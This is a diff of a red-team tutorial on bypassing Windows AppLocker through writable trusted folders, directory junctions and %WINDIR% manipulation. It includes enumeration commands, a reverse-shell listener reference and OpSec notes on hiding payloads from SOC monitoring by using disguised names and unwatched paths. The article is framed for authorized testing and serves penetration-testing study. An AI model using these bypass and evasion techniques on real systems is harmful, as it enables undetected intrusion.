@@ -1,11 +1,31 @@
 ---
 title: "AppLocker Bypass: Trusted Folder Abuse"
-date: 2026-03-06
-description: "Exploiting writable directories inside AppLocker-trusted paths — C:\\Windows\\Tasks, spool\\drivers\\color, and others — via direct execution, directory junctions, DLL hijacking, and environment variable manipulation."
+date: 2026-05-27
+weight: 3
+reading_path: "applocker"
+step: 3
+description: "Exploiting writable directories inside AppLocker-trusted paths, such as the Windows Tasks and printer driver folders, with hardening guidance."
+verified: "Windows 10/11 Enterprise · May 2026"
 tags: ["applocker", "bypass", "trusted-folders", "dll-hijacking", "lolbins", "evasion", "windows", "blueteam"]
 ---
 
 > **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1574](https://attack.mitre.org/techniques/T1574/) (Hijack Execution Flow), [T1574.001](https://attack.mitre.org/techniques/T1574/001/) (DLL Search Order Hijacking), [T1036](https://attack.mitre.org/techniques/T1036/) (Masquerading), and [T1574.010](https://attack.mitre.org/techniques/T1574/010/) (ServicesFile Permissions Weakness).
+
+---
+
+## How Do AppLocker Path Rules Work?
+
+AppLocker's default ruleset grants execution rights using path-based rules. Out of the box, the three blessed paths are:
+
+```
+%WINDIR%\*               → C:\Windows\...
+%PROGRAMFILES%\*         → C:\Program Files\...
+%PROGRAMFILES(X86)%\*   → C:\Program Files (x86)\...
+```
+
+Anything inside these directories, regardless of who put it there, is **trusted**. AppLocker evaluates the path. That's it. If the file lives under `C:\Windows\`, the rule fires, execution is allowed, and no further inspection happens.
+
+The assumption baked into this model is that only administrators can write to these directories. On a hardened system, that assumption holds. On a real-world enterprise box, it almost never does.
 
 ---
 
@@ -33,7 +53,7 @@ Reproduce every technique in an isolated snapshot environment before running any
 └─────────────────────────────────────────────────────────┘
 ```
 
-### Windows VM — AppLocker + Standard User Configuration
+### Windows VM: AppLocker + Standard User Configuration
 
 ```powershell {linenos=inline}
 # 1. Enable AppLocker service
@@ -85,7 +105,7 @@ Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 20 |
     Select-Object TimeCreated, Id, Message | Format-List
 ```
 
-### Attacker VM (Kali) — Payload Delivery Server
+### Attacker VM (Kali): Payload Delivery Server
 
 ```bash
 # Catch reverse shells
@@ -110,109 +130,76 @@ Roll back between technique tests to keep the environment consistent.
 
 ### AppLocker Path Trust Model
 
-``` {linenos=inline}
-AppLocker Rule Engine
-        │
-        ▼
-  Is the binary path inside a trusted location?
-        │
-  ┌─────┴──────────────────────────────────────┐
-  │                                            │
-  ▼                                            ▼
-%WINDIR%\*                            %PROGRAMFILES%\*
-%PROGRAMFILES(X86)%\*
-  │                                            │
-  ▼                                            ▼
- ALLOW ← path matched                   ALLOW ← path matched
-  │
-  └── Who wrote the file? ← AppLocker DOESN'T CHECK THIS
-        │
-        ├── Admin wrote it → legitimate use
-        └── Attacker wrote it → BYPASS (AppLocker still allows)
+The core weakness is that AppLocker asks *where* a binary lives, never *who put it there*. Path trust is not the same as write-access control:
 
-Key insight: path trust ≠ write-access control
+```mermaid
+flowchart TD
+    ENG["AppLocker rule engine"] --> Q{"Is the binary path\ninside a trusted location?"}
+    Q -->|"%WINDIR% or %PROGRAMFILES% subtree"| ALLOW["ALLOW (path matched)"]
+    Q -->|"outside trusted tree"| DENY["DENY"]
+    ALLOW --> WHO{"Who wrote the file?\nAppLocker never checks this"}
+    WHO -->|"admin wrote it"| LEGIT["Legitimate use"]
+    WHO -->|"attacker wrote it"| BYPASS["BYPASS, still allowed"]
 ```
 
 ### Writable Path Hierarchy Inside %WINDIR%
 
-``` {linenos=inline}
-C:\Windows\  (trusted by AppLocker default rule)
-│
-├── Tasks\                ← world-writable on many builds
-├── Tracing\              ← writable by authenticated users
-├── Temp\                 ← writable, but often blocked by group policy
-├── System32\spool\drivers\color\  ← writable on some configs
-├── SysWOW64\Tasks\       ← same as Tasks, 32-bit mirror
-│
-└── [any writable subdir] → drop payload → execute → AppLocker ALLOWS
+`C:\Windows\` is trusted by the default rule, yet several of its subdirectories are writable by non-admins. Any one of them is a drop point:
 
-Attacker's checklist:
-  accesschk.exe -wud "C:\Windows" -accepteula
-  accesschk.exe -wud "C:\Program Files" -accepteula
+```mermaid
+graph TD
+    W["C:/Windows (trusted by default rule)"] --> T1["Tasks — world-writable on many builds"]
+    W --> T2["Tracing — writable by authenticated users"]
+    W --> T3["Temp — writable, often blocked by GPO"]
+    W --> T4["System32/spool/drivers/color — writable on some configs"]
+    W --> T5["SysWOW64/Tasks — 32-bit mirror of Tasks"]
+    T1 --> DROP["Drop payload in any writable subdir\n→ execute → AppLocker ALLOWS"]
+    T2 --> DROP
+    T3 --> DROP
+    T4 --> DROP
+    T5 --> DROP
+```
+
+Enumerate writable paths inside the trusted trees with:
+
+```powershell
+accesschk.exe -wud "C:\Windows" -accepteula
+accesschk.exe -wud "C:\Program Files" -accepteula
 ```
 
 ### Directory Junction Abuse Flow
 
-``` {linenos=inline}
-Step 1: Find a path AppLocker trusts but can't write to directly
-        C:\Windows\System32\  (admin-only writes)
+A directory junction lets a trusted-looking path point at a directory you actually control, so AppLocker evaluates the trusted path while the file lives somewhere else:
 
-Step 2: Find a writable directory outside the trusted tree
-        C:\Users\testuser\AppData\Local\Temp\junc_source\
-
-Step 3: Create a junction from trusted-looking path → writable dir
-        mklink /J C:\Windows\Tasks\junction_name C:\Users\testuser\AppData\...
-
-Step 4: Drop payload into the writable directory
-        Copy-Item payload.exe C:\Users\testuser\AppData\...\payload.exe
-
-Step 5: Execute via the junction path
-        C:\Windows\Tasks\junction_name\payload.exe
-        ↑ AppLocker evaluates THIS path → matches %WINDIR%\* → ALLOW
-
-Step 6: Payload runs — AppLocker never saw the real write location
+```mermaid
+flowchart TD
+    S1["1. Trusted but admin-only path\nC:/Windows/System32"] --> S2["2. Writable dir outside the trusted tree\nAppData/Local/Temp/junc_source"]
+    S2 --> S3["3. mklink /J C:/Windows/Tasks/junction_name → writable dir"]
+    S3 --> S4["4. Copy payload.exe into the writable dir"]
+    S4 --> S5["5. Execute via C:/Windows/Tasks/junction_name/payload.exe"]
+    S5 --> S6{"AppLocker evaluates the junction path"}
+    S6 -->|"matches the %WINDIR% subtree"| ALLOW["ALLOW — never saw the real write location"]
 ```
 
 ### Environment Variable Manipulation Flow
 
-``` {linenos=inline}
-Normal resolution:
-  %WINDIR% → C:\Windows  (set by SYSTEM at boot)
+If `%WINDIR%` is user-controllable, redefining it makes the trusted path rule expand to a directory the attacker owns:
 
-Attacker perspective (when %WINDIR% is user-controllable):
-  Set-Item Env:WINDIR "C:\Users\testuser\AppData\Local\Temp\fakedir"
-       │
-       ▼
-  AppLocker path rule: %WINDIR%\*
-  Expands to: C:\Users\testuser\AppData\Local\Temp\fakedir\*
-       │
-       ▼
-  Attacker drops payload.exe into that fake dir
-  Executes it → AppLocker rule fires (expanded path matches) → ALLOW
-
-Note: Modern systems fix this with locked WINDIR expansion in AppLocker,
-      but legacy configs and some edge cases remain vulnerable.
+```mermaid
+flowchart TD
+    N["Normal: %WINDIR% → C:/Windows (set by SYSTEM at boot)"] --> A["Attacker sets Env:WINDIR to\nAppData/Local/Temp/fakedir"]
+    A --> E["Rule %WINDIR% subtree now expands to\nAppData/Local/Temp/fakedir"]
+    E --> D["Drop payload.exe into fakedir, execute"]
+    D --> ALLOW["Expanded path matches the rule → ALLOW"]
 ```
 
----
-
-## How AppLocker Path Rules Work
-
-AppLocker's default ruleset grants execution rights using path-based rules. Out of the box, the three blessed paths are:
-
-```
-%WINDIR%\*               → C:\Windows\...
-%PROGRAMFILES%\*         → C:\Program Files\...
-%PROGRAMFILES(X86)%\*   → C:\Program Files (x86)\...
-```
-
-Anything inside these directories, regardless of who put it there, is **trusted**. AppLocker evaluates the path. That's it. If the file lives under `C:\Windows\`, the rule fires, execution is allowed, and no further inspection happens.
-
-The assumption baked into this model is that only administrators can write to these directories. On a hardened system, that assumption holds. On a real-world enterprise box, it almost never does.
+Modern systems fix this with locked `%WINDIR%` expansion in AppLocker, but legacy configs and some edge cases remain vulnerable.
 
 ---
 
 ## The Attack Model
+
+Path rules trust a location, not the files inside it. When a directory under a trusted path is writable by a standard user, those two facts combine into a bypass: drop a payload into the writable directory and AppLocker approves it on the strength of its path alone. The chain below shows the full sequence.
 
 ```
 AppLocker path rule:  C:\Windows\* → ALLOW
@@ -230,7 +217,7 @@ The bypass lives entirely in the gap between **path trust** and **write access c
 
 ---
 
-## Phase 1 — Enumeration: Finding Writable Trusted Paths
+## Phase 1: Enumeration (Finding Writable Trusted Paths)
 
 ### Built-in writable directories (default Windows installs)
 
@@ -257,7 +244,7 @@ These are known. On your actual target, the installed software will have added m
 
 ---
 
-### Custom Tool 1 — PowerShell writable path enumerator
+### Custom Tool 1: PowerShell writable path enumerator
 
 ```powershell {linenos=inline}
 # Find-WritableTrustedPaths.ps1
@@ -355,7 +342,7 @@ Write-Host "`n[*] saved to writable_trusted_paths.csv" -ForegroundColor Cyan
 
 ---
 
-### Custom Tool 2 — C# standalone enumerator (no PowerShell dependency)
+### Custom Tool 2: C# standalone enumerator (no PowerShell dependency)
 
 Compile and drop this when PowerShell is locked down or Script Block Logging is hot.
 
@@ -467,7 +454,7 @@ PathFinder.exe 6        :: depth 6
 
 ---
 
-## Phase 2 — Exploitation
+## Phase 2: Exploitation
 
 ### Technique 1: Direct Execution from Writable Trusted Path
 
@@ -882,11 +869,11 @@ python3 trusted_path_stager.py \
 
 ## OpSec Notes
 
-- **`C:\Windows\Temp`** is the noisiest writable trusted path — most blue teams monitor it explicitly. Prefer `spool\drivers\color`, `tracing`, or `FxsTmp` which are rarely watched.
+- **`C:\Windows\Temp`** is the noisiest writable trusted path — most [blue teams monitor it explicitly](/docs/blueteam/lolbins-hunting/). Prefer `spool\drivers\color`, `tracing`, or `FxsTmp` which are rarely watched.
 - **Payload naming** matters. Files named `svchost.exe`, `lsass.exe`, or `explorer.exe` in non-standard locations are instant Tier-1 alerts on any SOC running Sysmon. Use plausible update or service names: `WmiApSrv.exe`, `MpCmdRun.exe`, `WUDFHost.exe`.
 - **Directory junctions** are logged by Sysmon EID 11 (FileCreate) when the junction itself is created, but traversal through the junction typically does not generate separate path-resolution events — making it quieter than a straight file drop.
 - **Environment variable manipulation** (`%WINDIR%`) leaves a trace in the registry if you use `SetEnvironmentVariable` at the `User` scope. Session-only (`set WINDIR=...`) is cleaner but dies with the process.
-- **DLL hijacking** is the stealthiest long-term play — the host process is legitimate, signed, expected to run. Your DLL lives inside a trusted application directory. No suspicious child processes unless your shell spawns one.
+- **[DLL hijacking](/docs/applocker/dll-hijacking/)** is the stealthiest long-term play — the host process is legitimate, signed, expected to run. Your DLL lives inside a trusted application directory. No suspicious child processes unless your shell spawns one.
 
 ---
 
